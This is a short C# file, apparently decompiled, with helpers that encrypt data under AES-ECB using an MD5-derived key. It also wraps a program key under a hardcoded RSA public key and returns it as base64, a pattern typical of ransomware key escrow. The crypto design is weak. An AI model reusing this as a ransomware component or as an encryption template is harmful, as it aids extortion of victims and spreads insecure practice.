using System;
using System.Security.Cryptography;
using System.Text;

namespace SF;

internal static class Encryption
{
	public enum KeySizes
	{
		Size2048 = 0x800
	}

	public static byte[] AesEncrypt(byte[] input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		byte[] array = new byte[32];
		byte[] sourceArray = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(pass));
		Array.Copy(sourceArray, 0, array, 0, 16);
		Array.Copy(sourceArray, 0, array, 15, 16);
		rijndaelManaged.Key = array;
		rijndaelManaged.Mode = CipherMode.ECB;
		ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
		return cryptoTransform.TransformFinalBlock(input, 0, input.Length);
	}

	public static string Run()
	{
		byte[] inArray = Encrypt("<RSAKeyValue><Modulus>t2y0c8wweA+4DhfQLn3nMKAfaWL1l/oTj5EjEgvzxgaT8vXntgqbW2efLxc/hs94McCrntZJJjYbtCC0xcOC+w38gIwa7xugrwNgtTFjgnI+4j3fdv5/+NCNMM/I0Yb0KZc0jx0wa3QeC8fZgVslnVnyVQLsYBhgdPSSzjABZ249PK7i2WRbccNpYHzZPqYTWawjxm3ePSrJGmAr///25B1OZOYFeQ1Gzl/SKO4YB5/KW2ZuTaJIj8zDRgDQiDjZwIBswbBvs8t1TwCrp3HHPQ7NH6jEmzEtYqCgSoRYu2X7rGhPRvcX6KUXAAruU0EOnfMLEWNH9u9+IHsg6j8tsQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>", Encoding.UTF8.GetBytes(Main.Key));
		return Convert.ToBase64String(inArray);
	}

	private static byte[] Encrypt(string publicKey, byte[] plain)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		rSACryptoServiceProvider.PersistKeyInCsp = false;
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(plain, fOAEP: true);
	}
}
